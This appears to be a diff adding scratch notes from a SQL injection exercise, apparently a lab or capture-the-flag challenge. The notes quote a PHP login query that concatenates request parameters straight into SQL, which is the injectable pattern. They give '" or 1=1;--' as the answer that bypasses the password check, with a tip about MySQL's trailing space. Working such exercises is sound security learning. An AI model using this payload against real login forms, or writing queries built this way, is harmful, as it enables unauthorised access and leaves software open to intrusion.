@@ -1,0 +1,23 @@
+$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
+
+select * from users where username=username and password=password;
+
+\"".$_REQUEST["password"]."\""
+
+if the query returns > 0 rows, login is successful.
+
+"\" or 1=1;--#"
+
+"SELECT * from users where username=\"" 
++ $_REQUEST["username"] 
++ " and password=\""
++ $_REQUEST["password"]
++ "\"";
+
+
+SELECT * from users where username=" 
++ $_REQUEST["username"] 
+
+
+answer: " or 1=1;-- 
+**don't forget the space at the end, because it's mysql
